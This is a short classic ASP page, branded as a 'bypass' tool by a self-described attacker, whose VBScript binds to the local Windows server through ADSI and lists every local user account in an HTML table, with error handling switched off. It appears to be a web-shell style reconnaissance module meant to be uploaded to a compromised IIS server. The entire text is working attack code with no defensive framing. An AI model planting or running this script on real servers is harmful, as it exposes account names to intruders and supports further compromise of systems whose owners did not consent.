<h1>Bypass Users Windows Server By Mauritania Attacker</h1>Results:
<TABLE BORDER="1" CELLSPACING="0">
<TR>
   
    <TD>Users List /</TD>
</TR>
<%
Dim sUserInfo
On Error Resume Next
Set oContainer = GetObject("WinNT://127.0.0.1")


For Each oIADs In oContainer

    If (oIADs.Class = "User") Then
        Set oUser = oIADs  
        UserName = ""
    Disabled = ""
        UserName = oUser.Name
%>
<TR> 
    <TD><%=UserName%> </TD>
<%    End If%>    
<%Next%>
</TABLE>